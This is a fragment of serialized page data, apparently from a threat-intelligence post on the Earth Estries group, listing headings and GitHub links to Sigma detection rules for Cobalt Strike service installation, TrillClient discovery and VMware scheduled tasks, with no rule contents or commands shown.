an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":207,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20exploiting%20QConvergeConsole%20vulnerability.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":82,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":83,"end":197,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20exploiting%20QConvergeConsole%20vulnerability.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*NCwqaxD6RDspMNij"}},"Paragraph:dcff7a17d5b3_405":{"__typename":"Paragraph","id":"dcff7a17d5b3_405","name":"e72e","type":"P","href":null,"layout":null,"metadata":null,"text":"Cobalt Strike Installation with Windows Service","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_406":{"__typename":"Paragraph","id":"dcff7a17d5b3_406","name":"6f4b","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries installation Cobalt Strike with Windows Service.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":213,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20installation%20Cobalt%20Strike%20with%20Windows%20Service.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":88,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":89,"end":203,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20installation%20Cobalt%20Strike%20with%20Windows%20Service.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*FH7YcbtwCWKQvBs5"}},"Paragraph:dcff7a17d5b3_407":{"__typename":"Paragraph","id":"dcff7a17d5b3_407","name":"9348","type":"P","href":null,"layout":null,"metadata":null,"text":"Executing TrillClient for Discovery","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_408":{"__typename":"Paragraph","id":"dcff7a17d5b3_408","name":"2f58","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries is executing as discovery TrillClient information stealer.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":223,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20is%20executing%20as%20discovery%20TrillClient%20information%20stealer.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":98,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":99,"end":213,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20is%20executing%20as%20discovery%20TrillClient%20information%20stealer.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*MilFvP7Ew5BPGG6P"}},"Paragraph:dcff7a17d5b3_409":{"__typename":"Paragraph","id":"dcff7a17d5b3_409","name":"a94c","type":"P","href":null,"layout":null,"metadata":null,"text":"Remote Scheduled Task Vmware","hasDropCap":null,"dropCapImage":null,"markups":[],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":null},"Paragraph:dcff7a17d5b3_410":{"__typename":"Paragraph","id":"dcff7a17d5b3_410","name":"502b","type":"MIXTAPE_EMBED","href":null,"layout":null,"metadata":null,"text":"Sigma-Rules\u002FEarth Estries remote scheduled task Vmware for persistence.yml at main ·…\nSigma Rules Threat Intelligence, Threat Hunting. Contribute to Schmouni242\u002FSigma-Rules development by creating an…github.com","hasDropCap":null,"dropCapImage":null,"markups":[{"__typename":"Markup","type":"A","start":0,"end":210,"href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20remote%20scheduled%20task%20Vmware%20for%20persistence.yml","anchorType":"LINK","userId":null,"linkMetadata":null},{"__typename":"Markup","type":"STRONG","start":0,"end":85,"href":null,"anchorType":null,"userId":null,"linkMetadata":null},{"__typename":"Markup","type":"EM","start":86,"end":200,"href":null,"anchorType":null,"userId":null,"linkMetadata":null}],"codeBlockMetadata":null,"iframe":null,"mixtapeMetadata":{"__typename":"MixtapeMetadata","href":"https:\u002F\u002Fgithub.com\u002FSchmouni242\u002FSigma-Rules\u002Fblob\u002Fmain\u002FEarth%20Estries%20remote%20scheduled%20task%20Vmware%20for%20persistence.yml","mediaResource":{"__typename":"MediaResource","mediumCatalog":null},"thumbnailImageId":"0*fp6bU-onZABU2i81"}},"CollectionViewerEdge:collectionId:d5fd8f494f6a-viewerId:lo_a14f4be3b504":{"__typename":"CollectionViewerEdge","id":"collectionId:d5fd8f494f6a-viewerId:lo_a14f4be3b504","isEditor":false,"isMuting":false},"UserViewerEdge:userId:3d60ce83d2f7-viewerId:lo_a14f4be3b504":{"__typename":"UserViewerEdge","id":"userId:3d60ce83d2f7-viewerId:lo_a14f4be3b504","isMuting":false},"ImageMetadata:":{"__typename":"ImageMetadata","id":"","originalWidth":0,"originalHeight":0},"PostViewerEdge:postId:379a6b950492-viewerId:lo_a14f4be3b504":{"__typename":"PostViewerEdge","shouldIndexPostForExternalSearch":true,"id":"postId:379a6b950492-viewerId:lo_a14f4be3b504"},"Tag:cybersecurity":{"__typename":"Tag","id":"cybersecurity","displayTitle":"Cybersecurity","normalizedTagSlug":"cybersecurity"},"Tag:threat-intelligence":{"__typename":"Tag","id":"threat-intelligence","displayTitle":"Threat Intelligence","normalizedTagSlug":"threat-intelligence"},"Tag:threat-hunting":{"__typename":"Tag","id":"threat-hunting","displayTitle":"Threat Hunting","normalizedTagSlug":"threat-hunting"},"Tag:china":{"__typename":"Tag","id":"china","displayTitle":"China","normalizedTagSlug":"china"},"Tag:detection-engineering":{"__typename":"Tag","id":"detection-engineering","displayTitle":"Detection Engineering","normalizedTagSlug":"detection-engineering"},"Post:379a6b950492":{"__typename":"Post","id":"379a6b950492","collection":{"__ref":"Collection:d5fd8f494f6a"},"content({\"postMeteringOptions\":{}})":{"__typename":"PostContent","isLockedPreviewOnly":false,"bodyModel":{"__typename":"RichText","sections":[{"__typename":"Section","name":"1b57","startIndex":0,"textLayout":null,"imageLayout":null,"backgroundImage":null,"videoLayout":null,"backgroundVideo":null}],"paragraphs":[{"__ref":"Paragraph:dcff7a17d5b3_0"},{"__ref":"Paragraph:dcff7a17d5b3_1"},{"__ref":"Paragraph:dcff7a17d5b3_2"},{"__ref":"Paragraph:dcff7a17d5b3_3"},{"__ref":"Paragraph:dcff7a17d5b3_4"},{"__ref":"Paragraph:dcff7a17d5b3_5"},{"__ref":"Paragraph:dcff7a17d5b3_6"},{"__ref":"Paragraph:dcff7a17d5b3_7"},{"__ref":"Paragraph:dcff7a17d5b3_8"},{"__ref":"Paragraph:dcff7a17d5b3_9"},{"__ref":"Paragraph:dcff7a17d5b3_10"},{"__ref":"Paragraph:dcff7a17d5b3_11"},{"__ref":"Paragraph:dcff7a17d5b3_12"},{"__ref":"Paragraph:dcff7a17d5b3_13"},{"__ref":"Paragraph:dcff7a17d5b3_14"},{"__ref":"Paragraph:dcff7a17d5b3_15"},{"__ref":"Paragraph:dcff7a17d5b3_16"},{"__ref":"Paragraph:dcff7a17d5b3_17"},{"__ref":"Paragraph:dcff7a17d5b3_18"},{"__ref":"Paragraph:dcff7a17d5b3_19"},{"__ref":"Paragraph:dcff7a17d5b3_20"},{"__ref":"Paragraph:dcff7a17d5b3_21"},{"__ref":"Paragraph:dcff7a17d5b3_22"},{"__ref":"Paragraph:dcff7a17d5b3_23"},{"__ref":"Paragraph:dcff7a17d5b3_24"},{"__ref":"Paragraph:dcff7a17d5b3_25"},{"__ref":"Paragraph:dcff7a17d5b3_26"},{"__ref":"Paragraph:dcff7a17d5b3_27"},{"__ref":"Paragraph:dcff7a17d5b3_28"},{"__ref":"Paragraph:dcff7a17d5b3_29"},{"__ref":"Paragraph:dcff7a17d5b3_30"},{"__ref":"Paragraph:dcff7a17d5b3_31"},{"__ref":"Paragraph:dcff7a17d5b3_32"},{"__ref":"Paragraph:dcff7a17d5b3_33"},{"__ref":"Paragraph:dcff7a17d5b3_34"},{"__ref":"Paragraph:dcff7a17d5b3_35"},{"__ref":"Paragraph:dcff7a17d5b3_36"},{"__ref":"Paragraph:dcff7a17d5b3_37"},{"__ref":"Paragraph:dcff7a17d5b3_38"},{"__ref":"Paragraph:dcff7a17d5b3_39"},{"__ref":"Paragraph:dcff7a17d5b3_40"},{"__ref":"Paragraph:dcff7a17d5b3_41"},{"__ref":"Paragraph:dcff7a17d5b3_42"},{"__ref":"Paragraph:dcff7a17d5b3_43"},{"__ref":"Paragraph:dcff7a17d5b3_44"},{"__ref":"Paragraph:dcff7a17d5b3_45"},{"__ref":"Paragraph:dcff7a17d5b3_46"},{"__ref":"Paragraph:dcff7a17d5b3_47"},{"__ref":"Paragraph:dcff7a17d5b3_48"},{"__ref":"Paragraph:dcff7a17d5b3_49"},{"__ref":"Paragraph:dcff7a17d5b3_50"},{"__ref":"Paragraph:dcff7a17d5b3_51"},{"__ref":"Paragraph:dcff7a17d5b3_52"},{"__ref":"Paragraph:dcff7a17d5b3_53"},{"__ref":"Paragraph:dcff7a17d5b3_54"},{"__ref":"Paragraph:dcff7a17d5b3_55"},{"__ref":"Paragraph:dcff7a17d5b3_56"},{"__ref":"Paragraph:dcff7a17d5b3_57"},{"__ref":"Paragraph:dcff7a17d5b3_58"},{"__ref":"Paragraph:dcff7a17d5b3_59"},{"__ref":"Paragraph:dcff7a17d5b3_60"},{"__ref":"Paragraph:dcff7a17d5b3_61"},{"__ref":"Paragraph:dcff7a17d5b3_62"},{"__ref":"Paragraph:dcff7a17d5b3_63"},{"__ref":"Paragraph:dcff7a17d5b3_64"},{"__ref":"Paragraph:dcff7a17d5b3_65"},{"__ref":"Paragraph:dcff7a17d5b3_66"},{"__ref":"Paragraph:dcff7a17d5b3_67"},{"__ref":"Paragraph:dcff7a17d5b3_68"},{"__ref":"Paragraph:dcff7a17d5b3_69"},{"__ref":"Paragraph:dcff7a17d5b3_70"},{"__ref":"Paragraph:dcff7a17d5b3_71"},{"__ref":"Paragraph:dcff7a17d5b3_72"},{"__ref":"Paragraph:dcff7a17d5b3_73"},{"__ref":"Paragraph:dcff7a17d5b3_74"},{"__ref":"Paragraph:dcff7a17d5b3_75"},{"__ref":"Paragraph:dcff7a17d5b3_76"},{"__ref":"Paragraph:dcff7a17d5b3_77"},{"__ref":"Paragraph:dcff7a17d5b3_78"},{"__ref":"Paragraph:dcff7a17d5b3_79"},{"__ref":"Paragraph:dcff7a17d5b3_80"},{"__ref":"Paragraph:dcff7a17d5b3_81"},{"__ref":"Paragraph:dcff7a17d5b3_82"},{"__ref":"Paragraph:dcff7a17d5b3_83"},{"__ref":"Paragraph:dcff7a17d5b3_84"},{"__ref":"Paragraph:dcff7a17d5b3_85"},{"__ref":"Paragraph:dcff7a17d5b3_86"},{"__ref":"Paragraph:dcff7a17d5b3_87"},{"__ref":"Paragraph:dcff7a17d5b3_88"},{"__ref":"Paragraph:dcff7a17d5b3_89"},{"__ref":"Paragraph:dcff7a17d5b3_90"},{"__ref":"Paragraph:dcff7a17d5b3_91"},{"__ref":"Paragraph:dcff7a17d5b3_92"},{"__ref":"Paragraph:dcff7a17d5b3_93"},{"__ref":"Paragraph:dcff7a17d5b3_94"},{"__ref":"Paragraph:dcff7a17d5b3_95"},{"__ref":"Paragraph:dcff7a17d5b3_96"},{"__ref":"Paragraph:dcff7a17d5b3_97"},{"__ref":"Paragraph:dcff7a17d5b3_98"},{"__ref":"Paragraph:dcff7a17d5b3_99"},{"__ref":"Paragraph:dcff7a17d5b3_100"},{"__ref":"Paragraph:dcff7a17d5b3_101"},{"__ref":"Paragraph:dcff7a17d5b3_102"},{"__ref":"Paragraph:dcff7a17d5b3_103"},{"__ref":"Paragraph:dcff7a17d5b3_104"},{"__ref":"Paragraph:dcff7a17d5b3_105"},{"__ref":"Paragraph:dcff7a17d5b3_106"},{"__ref":"Paragraph:dcff7a17d5b3_107"},{"__ref":"Paragraph:dcff7a17d5b3_108"},{"__ref":"Paragraph:dcff7a17d5b3_109"},{"__ref":"Paragraph:dcff7a17d5b3_110"},{"__ref":"Paragraph:dcff7a17d5b3_111"},{"__ref":"Paragraph:dcff7a17d5b3_112"},{"__ref":"Paragraph:dcff7a17d5b3_113"},{"__ref":"Paragraph:dcff7a17d5b3_114"},{"__ref":"Paragraph:dcff7a17d5b3_115"},{"__ref":"Paragraph:dcff7a17d5b3_116"},{"__ref":"Paragraph:dcff7a17d5b3_117"},{"__ref":"Paragraph:dcff7a17d5b3_118"},{"__ref":"Paragraph:dcff7a17d5b3_119"},{"__ref":"Paragraph:dcff7a17d5b3_120"},{"__ref":"Paragraph:dcff7a17d5b3_121"},{"__ref":"Paragraph:dcff7a17d5b3_122"},{"__ref":"Paragraph:dcff7a17d5b3_123"},{"__ref":"Paragraph:dcff7a17d5b3_124"},{"__ref":"Paragraph:dcff7a17d5b3_125"},{"__ref":"Paragraph:dcff7a17d5b3_126"},{"__ref":"Paragraph:dcff7a17d5b3_127"},{"__ref":"Paragraph:dcff7a17d5b3_128"},{"__ref":"Paragraph:dcff7a17d5b3_129"},{"__ref":"Paragraph:dcff7a17d5b3_130"},{"__ref":"Paragraph:dcff7a17d5b3_131"},{"__ref":"Paragraph:dcff7a17d5b3_132"},{"__ref":"Paragraph:dcff7a17d5b3_133"},{"__ref":"Paragraph:dcff7a17d5b3_134"},{"__ref":"Paragraph:dcff7a17d5b3_135"},{"__ref":"Paragraph:dcff7a17d5b3_136"},{"__ref":"Paragraph:dcff7a17d5b3_137"},{"__ref":"Paragraph:dcff7a17d5b3_138"},{"__ref":"Paragraph:dcff7a17d5b3_139"},{"__ref":"Paragraph:dcff7a17d5b3_140"},{"__ref":"Paragraph:dcff7a17d5b3_141"},{"__ref":"Paragraph:dcff7a17d5b3_142"},{"__ref":"Paragraph:dcff7a17d5b3_143"},{"__ref":"Paragraph:dcff7a17d5b3_144"},{"__ref":"Paragraph:dcff7a17d5b3_145"},{"__ref":"Paragraph:dcff7a17d5b3_146"},{"__ref":"Paragraph:dcff7a17d5b3_147"},{"__ref":"Paragraph:dcff7a17d5b3_148"},{"__ref":"Paragraph:dcff7a17d5b3_149"},{"__ref":"Paragraph:dcff7a17d5b3_150"},{"__ref":"Paragraph:dcff7a17d5b3_151"},{"__ref":"Paragraph:dcff7a17d5b3_152"},{"__ref":"Paragraph:dcff7a17d5b3_153"},{"__ref":"Paragraph:dcff7a17d5b3_154"},{"__ref":"Paragraph:dcff7a17d5b3_155"},{"__ref":"Paragraph:dcff7a17d5b3_156"},{"__ref":"Paragraph:dcff7a17d5b3_157"},{"__ref":"Paragraph:dcff7a17d5b3_158"},{"__ref":"Paragraph:dcff7a17d5b3_159"},{"__ref":"Paragraph:dcff7a17d5b3_160"},{"__ref":"Paragraph:dcff7a17d5b3_161"},{"__ref":"Paragraph:dcff7a17d5b3_162"},{"__ref":"Paragraph:dcff7a17d5b3_163"},{"__ref":"Paragraph:dcff7a17d5b3_164"},{"__ref":"Paragraph:dcff7a17d5b3_165"},{"__ref":"Paragraph:dcff7a17d5b3_166"},{"__ref":"Paragraph:dcff7a17d5b3_167"},{"__ref":"Paragraph:dcff7a17d5b3_168"},{"__ref":"Paragraph:dcff7a17d5b3_169"},{"__ref":"Paragraph:dcff7a17d5b3_170"},{"__ref":"Paragraph:dcff7a17d5b3_171"},{"__ref":"Paragraph:dcff7a17d5b3_172"},{"__ref":"Paragraph:dcff7a17d5b3_173"},{"__ref":"Paragraph:dcff7a17d5b3_174"},{"__ref":"Paragraph:dcff7a17d5b3_175"},{"__ref":"Paragraph:dcff7a17d5b3_176"},{"__ref":"Paragraph:dcff7a17d5b3_177"},{"__ref":"Paragraph:dcff7a17d5b3_178"},{"__ref":"Paragraph:dcff7a17d5b3_179"},{"__ref":"Paragraph:dcff7a17d5b3_180"},{"__ref":"Paragraph:dcff7a17d5b3_181"},{"__ref":"Paragraph:dcff7a17d5b3_182"},{"__ref":"Paragraph:dcff7a17d5b3_183"},{"__ref":"Paragraph:dcff7a17d5b3_184"},{"__ref":"Paragraph:dcff7a17d5b3_185"},{"__ref":"Paragraph:dcff7a17d5b3_186"},{"__ref":"Paragraph:dcff7a17d5b3_187"},{"__ref":"Paragraph:dcff7a17d5b3_188"},{"__ref":"Paragraph:dcff7a17d5b3_189"},{"__ref":"Paragraph:dcff7a17d5b3_190"},{"__ref":"Paragraph:dcff7a17d5b3_191"},{"__ref":"Paragraph:dcff7a17d5b3_192"},{"__ref":"Paragraph:dcff7a17d5b3_193"},{"__ref":"Paragraph:dcff7a17d5b3_194"},{"__ref":"Paragraph:dcff7a17d5b3_195"},{"__ref":"Paragraph:dcff7a17d5b3_196"},{"__ref":"Paragraph:dcff7a17d5b3_197"},{"__ref":"Paragraph:dcff7a17d5b3_198"},{"__ref":"Paragraph:dcff7a17d5b3_199"},{"__ref":"Paragraph:dcff7a17d5b3_200"},{"__ref":"Paragraph:dcff7a17d5b3_201"},{"__ref":"Paragraph:dcff7a17d5b3_202"},{"__ref":"Paragraph:dcff7a17d5b3_203"},{"__ref":"Paragraph:dcff7a17d5b3_204"},{"__ref":"Paragraph:dcff7a17d5b3_205"},{"__ref":"Paragraph:dcff7a17d5b3_206"},{"__ref":"Paragraph:dcff7a17d5b3_207"},{"__ref":"Paragraph:dcff7a17d5b3_208"},{"__ref":"Paragraph:dcff7a17d5b3_209"},{"__ref":"Paragraph:dcff7a17d5b3_210"},{"__ref":"Paragraph:dcff7a17d5b3_211"},{"__ref":"Paragraph:dcff7a17d5b3_212"},{"__ref":"Paragraph:dcff7a17d5b3_213"},{"__ref":"Paragraph:dcff7a17d5b3_214"},{"__ref":"Paragraph:dcff7a17d5b3_215"},{"__ref":"Paragraph:dcff7a17d5b3_216"},{"__ref":"Paragraph:dcff7a17d5b3_217"},{"__ref":"Paragraph:dcff7a17d5b3_218"},{"__ref":"Paragraph:dcff7a17d5b3_219"},{"__ref":"Paragraph:dcff7a17d5b3_220"},{"__ref":"Paragraph:dcff7a17d5b3_221"},{"__ref":"Paragraph:dcff7a17d5b3_222"},{"__ref":"Paragraph:dcff7a17d5b3_223"},{"__ref":"Paragraph:dcff7a17d5b3_224"},{"__ref":"Paragraph:dcff7a17d5b3_225"},{"__ref":"Paragraph:dcff7a17d5b3_226"},{"__ref":"Paragraph:dcff7a17d5b3_227"},{"__ref":"Paragraph:dcff7a17d5b3_228"},{"__ref":"Paragraph:dcff7a17d5b3_229"},{"__ref":"Paragraph:dcff7a17d5b3_230"},{"__ref":"Paragraph:dcff7a17d5b3_231"},{"__ref":"Paragraph:dcff7a17d5b3_232"},{"__ref":"Paragraph:dcff7a17d5b3_233"},{"__ref":"Paragraph:dcff7a17d5b3_234"},{"__ref":"Paragraph:dcff7a17d5b3_235"},{"__ref":"Paragraph:dcff7a17d5b3_236"},{"__ref":"Paragraph:dcff7a17d5b3_237"},{"__ref":"Paragraph:dcff7a17d5b3_238"},{"__ref":"Paragraph:dcff7a17d5b3_239"},{"__ref":"Paragraph:dcff7a17d5b3_240"},{"__ref":"Paragraph:dcff7a17d5b3_241"},{"__ref":"Paragraph:dcff7a17d5b3_242"},{"__ref":"Paragraph:dcff7a17d5b3_243"},{"__ref":"Paragraph:dcff7a17d5b3_244"},{"__ref":"Paragraph:dcff7a17d5b3_245"},{"__ref":"Paragraph:dcff7a17d5b3_246"},{"__ref":"Paragraph:dcff7a17d5b3_247"},{"__ref":"Paragraph:dcff7a17d5b3_248"},{"__ref":"Paragraph:dcff7a17d5b3_249"},{"__ref":"Paragraph:dcff7a17d5b3_250"},{"__ref":"Paragraph:dcff7a17d5b3_251"},{"__ref":"Paragraph:dcff7a17d5b3_252"},{"__ref":"Paragraph:dcff7a17d5b3_253"},{"__ref":"Paragraph:dcff7a17d5b3_254"},{"__ref":"Paragraph:dcff7a17d5b3_255"},{"__ref":"Paragraph:dcff7a17d5b3_256"},{"__ref":"Paragraph:dcff7a17d5b3_257"},{"__ref":"Paragraph:dcff7a17d5b3_258"},{"__ref":"Paragraph:dcff7a17d5b3_259"},{"__ref":"Paragraph:dcff7a17d5b3_260"},{"__ref":"Paragraph:dcff7a17d5b3_261"},{"__ref":"Paragraph:dcff7a17d5b3_262"},{"__ref":"Paragraph:dcff7a17d5b3_263"},{"__ref":"Paragraph:dcff7a17d5b3_264"},{"__ref":"Paragraph:dcff7a17d5b3_265"},{"__ref":"Paragraph:dcff7a17d5b3_266"},{"__ref":"Paragraph:dcff7a17d5b3_267"},{"__ref":"Paragraph:dcff7a17d5b3_268"},{"__ref":"Paragraph:dcff7a17d5b3_269"},{"__ref":"Paragraph:dcff7a17d5b3_270"},{"__ref":"Paragraph:dcff7a17d5b3_271"},{"__ref":"Paragraph:dcff7a17d5b3_272"},{"__ref":"Paragraph:dcff7a17d5b3_273"},{"__ref":"Paragraph:dcff7a17d5b3_274"},{"__ref":"Paragraph:dcff7a17d5b3_275"},{"__ref":"Paragraph:dcff7a17d5b3_276"},{"__ref":"Paragraph:dcff7a17d5b3_277"},{"__ref":"Paragraph:dcff7a17d5b3_278"},{"__ref":"Paragraph:dcff7a17d5b3_279"},{"__ref":"Paragraph:dcff7a17d5b3_280"},{"__ref":"Paragraph:dcff7a17d5b3_281"},{"__ref":"Paragraph:dcff7a17d5b3_282"},{"__ref":"Paragraph:dcff7a17d5b3_283"},{"__ref":"Paragraph:dcff7a17d5b3_284"},{"__ref":"Paragraph:dcff7a17d5b3_285"},{"__ref":"Paragraph:dcff7a17d5b3_286"},{"__ref":"Paragraph:dcff7a17d5b3_287"},{"__ref":"Paragraph:dcff7a17d5b3_288"},{"__ref":"Paragraph:dcff7a17d5b3_289"},{"__ref":"Paragraph:dcff7a17d5b3_290"},{"__ref":"Paragraph:dcff7a17d5b3_291"},{"__ref":"Paragraph:dcff7a17d5b3_292"},{"__ref":"Paragraph:dcff7a17d5b3_293"},{"__ref":"Paragraph:dcff7a17d5b3_294"},{"__ref":"Paragraph:dcff7a17d5b3_295"},{"__ref":"Paragraph:dcff7a17d5b3_296"},{"__ref":"Paragraph:dcff7a17d5b3_297"},{"__ref":"Paragraph:dcff7a17d5b3_298"},{"__ref":"Paragraph:dcff7a17d5b3_299"},{"__ref":"Paragraph:dcff7a17d5b3_300"},{"__ref":"Paragraph:dcff7a17d5b3_301"},{"__ref":"Paragraph:dcff7a17d5b3_302"},{"__ref":"Paragraph:dcff7a17d5b3_303"},{"__ref":"Paragraph:dcff7a17d5b3_304"},{"__ref":"Paragraph:dcff7a17d5b3_305"},{"__ref":"Paragraph:dcff7a17d5b3_306"},{"__ref":"Paragraph:dcff7a17d5b3_307"},{"__ref":"Paragraph:dcff7a17d5b3_308"},{"__ref":"Paragraph:dcff7a17d5b3_309"},{"__ref":"Paragraph:dcff7a17d5b3_310"},{"__ref":"Paragraph:dcff7a17d5b3_311"},{"__ref":"Paragraph:dcff7a17d5b3_312"},{"__ref":"Paragraph:dcff7a17d5b3_313"},{"__ref":"Paragraph:dcff7a17d5b3_314"},{"__ref":"Paragraph:dcff7a17d5b3_315"},{"__ref":"Paragraph:dcff7a17d5b3_316"},{"__ref":"Paragraph:dcff7a17d5b3_317"},{"__ref":"Paragraph:dcff7a17d5b3_318"},{"__ref":"Paragraph:dcff7a17d5b3_319"},{"__ref":"Paragraph:dcff7a17d5b3_320"},{"__ref":"Paragraph:dcff7a17d5b3_321"},{"__ref":"Paragraph:dcff7a17d5b3_322"},{"__ref":"Paragraph:dcff7a17d5b3_323"},{"__ref":"Paragraph:dcff7a17d5b3_324"},{"__ref":"Paragraph:dcff7a17d5b3_325"},{"__ref":"Paragraph:dcff7a17d5b3_326"},{"__ref":"Paragraph:dcff7a17d5b3_327"},{"__ref":"Paragraph:dcff7a17d5b3_328"},{"__ref":"Paragraph:dcff7a17d5b3_329"},{"__ref":"Paragraph:dcff7a17d5b3_330"},{"__ref":"Paragraph:dcff7a17d5b3_331"},{"__ref":"Paragraph:dcff7a17d5b3_332"},{"__ref":"Paragraph:dcff7a17d5b3_333"},{"__ref":"Paragraph:dcff7a17d5b3_334"},{"__ref":"Paragraph:dcff7a17d5b3_335"},{"__ref":"Paragraph:dcff7a17d5b3_336"},{"__ref":"Paragraph:dcff7a17d5b3_337"},{"__ref":"Paragraph:dcff7a17d5b3_338"},{"__ref":"Paragraph:dcff7a17d5b3_339"},{"__ref":"Paragraph:dcff7a17d5b3_340"},{"__ref":"Paragraph:dcff7a17d5b3_341"},{"__ref":"Paragraph:dcff7a17d5b3_342"},{"__ref":"Paragraph:dcff7a17d5b3_343"},{"__ref":"Paragraph:dcff7a17d5b3_344"},{"__ref":"Paragraph:dcff7a17d5b3_345"},{"__ref":"Paragraph:dcff7a17d5b3_346"},{"__ref":"Paragraph:dcff7a17d5b3_347"},{"__ref":"Paragraph:dcff7a17d5b3_348"},{"__ref":"Paragraph:dcff7a17d5b3_349"},{"__ref":"Paragraph:dcff7a17d5b3_350"},{"__ref":"Paragraph:dcff7a17d5b3_351"},{"__ref":"Paragraph:dcff7a17d5b3_352"},{"__ref":"Paragraph:dcff7a17d5b3_353"},{"__ref":"Paragraph:dcff7a17d5b3_354"},{"__ref":"Paragraph:dcff7a17d5b3_355"},{"__ref":"Paragraph:dcff7a17d5b3_356"},{"__ref":"Paragraph:dcff7a17d5b3_357"},{"__ref":"Paragraph:dcff7a17d5b3_358"},{"__ref":"Paragraph:dcff7a17d5b3_359"},{"__ref":"Paragraph:dcff7a17d5b3_360"},{"__ref":"Paragraph:dcff7a17d5b3_361"},{"__ref":"Paragraph:dcff7a17d5b3_362"},{"__ref":"Paragraph:dcff7a17d5b3_363"},{"__ref":"Paragraph:dcff7a17d5b3_364"},{"__ref":"Paragraph:dcff7a17d5b3_365"},{"__ref":"Paragraph:dcff7a17d5b3_366"},{"__ref":"Paragraph:dcff7a17d5b3_367"},{"__ref":"Paragraph:dcff7a17d5b3_368"},{"__ref":"Paragraph:dcff7a17d5b3_369"},{"__ref":"Paragraph:dcff7a17d5b3_370"},{"__ref":"Paragraph:dcff7a17d5b3_371"},{"__ref":"Paragraph:dcff7a17d5b3_372"},{"__ref":"Paragraph:dcff7a17d5b3_373"},{"__ref":"Paragraph:dcff7a17d5b3_374"},{"__ref":"Paragraph:dcff7a17d5b3_375"},{"__ref":"Paragraph:dcff7a17d5b3_376"},{"__ref":"Paragraph:dcff7a17d5b3_377"},{"__ref":"Paragraph:dcff7a17d5b3_378"},{"__ref":"Paragraph:dcff7a17d5b3_379"},{"__ref":"Paragraph:dcff7a17d5b3_380"},{"__ref":"Paragraph:dcff7a17d5b3_381"},{"__ref":"Paragraph:dcff7a17d5b3_382"},{"__ref":"Paragraph:dcff7a17d5b3_383"},{"__ref":"Paragraph:dcff7a17d5b3_384"},{"__ref":"Paragraph:dcff7a17d5b3_385"},{"__ref":"Paragraph:dcff7a17d5b3_386"},{"__ref":"Paragraph:dcff7a17d5b3_387"},{"__ref":"Paragraph:dcff7a17d5b3_388"},{"__ref":"Paragraph:dcff7a17d5b3_389"},{"__ref":"Paragraph:dcff7a17d5b3_390"},{"__ref":"Paragraph:dcff7a17d5b3_391"},{"__ref":"Paragraph:dcff7a17d5b3_392"},{"__ref":"Paragraph:dcff7a17d5b3_393"},{"__ref":"Paragraph:dcff7a17d5b3_394"},{"__ref":"Paragraph:dcff7a17d5b3_395"},{"__ref":"Paragraph:dcff7a17d5b3_396"},{"__ref":"Paragraph:dcff7a17d5b3_397"},{"__ref":"Paragraph:dcff7a17d5b3_398"},{"__ref":"Paragraph:dcff7a17d5b3_399"},{"__ref":"Paragraph:dcff7a17d5b3_400"},{"__ref":"Paragraph:dcff7a17d5b3_401"},{"__ref":"Paragraph:dcff7a17d5b3_402"},{"__ref":"Paragraph:dcff7a17d5b3_403"},{"__ref":"Paragraph:dcff7a17d5b3_404"},{"__ref":"Paragraph:dcff7a17d5b3_405"},{"__ref":"Paragraph:dcff7a17d5b3_406"},{"__ref":"Paragraph:dcff7a17d5b3_407"},{"__ref":"Paragraph:dcff7a17d5b3_408"},{"__ref":"Paragraph:dcff7a17d5b3_409"},{"__ref":"Paragraph:dcff7a17d5b3_410"}]},"validatedShareKey":"","s